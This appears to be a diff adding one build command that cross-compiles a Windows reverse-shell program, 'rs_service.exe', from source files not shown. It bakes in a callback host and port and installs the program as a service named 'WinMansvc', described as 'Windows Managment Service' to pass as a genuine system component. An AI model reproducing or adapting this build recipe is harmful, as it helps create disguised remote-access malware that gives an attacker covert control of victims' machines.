@@ -1,0 +1,1 @@
+x86_64-w64-mingw32-gcc main.c service.c shell.c -o rs_service.exe -DSERVER_HOST=L"\"127.0.0.1\"" -DSERVER_PORT=L"\"1234\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
